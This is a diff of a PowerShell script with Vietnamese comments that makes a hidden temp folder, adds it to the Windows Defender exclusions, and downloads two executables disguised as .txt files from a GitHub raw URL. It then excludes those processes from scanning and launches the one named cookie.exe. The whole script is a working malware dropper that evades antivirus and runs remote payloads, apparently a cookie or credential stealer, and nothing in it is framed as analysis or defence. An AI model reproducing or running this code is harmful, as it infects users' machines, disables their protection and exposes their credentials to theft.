@@ -1,17 +1,30 @@
 $systemPath = [System.IO.Path]::Combine($env:temp, "System")
 New-Item -Path $systemPath -ItemType Directory -Force
+
+# Thêm loại trừ cho thư mục
 try {
-Add-MpPreference -ExclusionPath $systemPath
+    Add-MpPreference -ExclusionPath $systemPath
 } catch {}
+
 $cookieUrl = "https://raw.githubusercontent.com/blackcodeit407/system/main/cookie.txt"
 $cookiePath = [System.IO.Path]::Combine($systemPath, "cookie.exe")
+
+# Tải cookie.exe
 Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
+
+# Thêm loại trừ cho quá trình cookie.exe
 try {
-Add-MpPreference -ExclusionProcess $cookiePath
+    Add-MpPreference -ExclusionProcess $cookiePath
 } catch {}
+
 $getfileUrl = "https://raw.githubusercontent.com/blackcodeit407/system/main/noname.txt"
 $getfilePath = [System.IO.Path]::Combine($systemPath, "getfile.exe")
+
+# Tải getfile.exe
 Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath
+
+# Thêm loại trừ cho quá trình getfile.exe và bắt đầu quá trình
 try {
-Add-MpPreference -ExclusionProcess $getfilePath
-Start-Process -FilePath $cookiePath -ArgumentList "-Bypass"
+    Add-MpPreference -ExclusionProcess $getfilePath
+    Start-Process -FilePath $cookiePath -ArgumentList "-Bypass"
+} catch {}
